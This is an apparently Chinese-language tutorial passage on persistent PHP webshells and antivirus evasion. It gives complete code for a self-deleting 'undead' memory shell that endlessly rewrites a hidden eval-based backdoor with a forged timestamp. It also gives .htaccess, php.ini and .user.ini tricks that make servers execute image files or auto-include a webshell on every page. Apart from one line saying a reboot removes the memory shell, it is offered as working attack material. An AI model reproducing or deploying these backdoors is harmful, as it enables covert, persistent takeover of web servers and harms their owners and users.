5.内存木马，也称不死马。

原理就是php文件运行之后，当此文件删除但脚本仍在web容器运行，利用这个，每隔几秒生成一个木马文件。

<?php  set_time_limit(0);      //设置脚本执行时间,0 为无时间限制  ignore_user_abort(1);  //与客户机断开不终止脚本的执行  unlink(__FILE__);      //然后删除文件自身  $file = '/var/www/html/.shell.php';  //$file = 'D:\phpstudy_pro\WWW\h\.shell.php';  $code = '<?php @eval($_POST['pwd']);?>';while (1) {    file_put_contents($file, $code);  //写shell文件    system('touch -m -d "2020-10-19 13:50:11" .shell.php');    //修改时间戳    usleep(1000);      //以指定的微秒数延缓程序的执行  }?>

删除内存马的最好方式就是重启服务器。


免杀小技巧(3)


1.修改.htaccess文件

AppType application/x-httpd-php  .jpg #会将本目录下的.jpg文件当做php代码运行。php_value auto_append_file D:/123.txt #自动包含文件。php_value auto_append_file .htaccess #包含自己。#<?php phpinfo();

2.修改php.ini

修改auto_prepend_file = shell.txt或auto_append_file= shell.txt

再修改include_path，可以通过任意页面进行访问include_path = ".;D:\phpstudy\www\"

在路徑D:\phpstudy\www\中写入webshell.txt

这样不管在任何页面都会自动加载我们的木马文件。

3.   .user.ini

.user.ini文件类似于.htaccess,不过前者使用面更广

文件中写入其中一句

auto_prepend_file = a.jpgauto_append_file = a.jpg

然后再a.jpg中合成一句话木马

当和.user.ini同目录下的php文件执行时，就会自动包含a.jpg，实现木马。
